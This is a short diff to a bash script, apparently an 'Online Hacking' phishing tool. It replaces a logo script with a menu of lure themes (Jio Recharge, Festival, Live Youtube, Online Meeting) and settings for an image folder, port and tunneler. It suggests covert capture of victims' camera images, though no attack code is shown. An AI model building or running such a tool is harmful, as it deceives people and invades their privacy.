@@ -368,8 +368,18 @@ while true; do
 clear
 echo -e "$logo"
 sleep 1
-
-bash OnlineHacking/logo2.sh
+echo -e "${ask}Choose an option:
+${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
+${cyan}[${white}2${cyan}] ${yellow}Festival
+${cyan}[${white}3${cyan}] ${yellow}Live Youtube
+${cyan}[${white}4${cyan}] ${yellow}Online Meeting
+${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
+${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
+${cyan}[${white}t${cyan}] ${yellow}Change Default Tunneler (current: ${red}${TN}${yellow})
+${cyan}[${white}x${cyan}] ${yellow}About
+${cyan}[${white}m${cyan}] ${yellow}More tools
+${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
+"
 
 sleep 1
 printf "${cyan}\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
